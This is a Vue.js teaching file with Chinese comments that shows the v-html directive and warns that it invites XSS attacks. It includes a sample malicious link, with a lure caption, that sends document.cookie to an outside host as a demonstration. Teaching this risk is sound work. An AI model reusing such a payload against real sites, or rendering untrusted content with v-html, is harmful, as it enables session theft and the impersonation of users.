<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>v-html指令</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				v-html指令：
						1.作用：向指定节点中渲染包含html结构的内容。
						2.与插值语法的区别：
									(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
									(2).v-html可以识别html结构。
						3.严重注意：v-html有安全性问题！！！！
						//首先我们要知道cookie是什么，就是比如你在淘宝买东西，切换页面不用再输入账号密码，这个功能最好用cookie做
						cookie的本质就是字符串，形式就是key value（类似于json）是服务器给的 这个东西如果被别人拿到就很危险了，以后不懂去听老师的课，很详细

									(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。（冒充用户之手）
									(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！（你的用户可能是一个破坏者）
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<div>你好，{{name}}</div>
			<div v-html="str"></div><!-- 与v-text的区别，可以解析标签结构 -->
			<div v-html="str2"></div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				str:'<h3>你好啊！</h3>',
				//用户写了这么一串坏代码，也能给他解析咯，容易导致XSS攻击
				//获取当前网站的所有cookie并且以文件形式传给坏的服务器  http://www.baidu.com后面的？就是传参
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
</html>
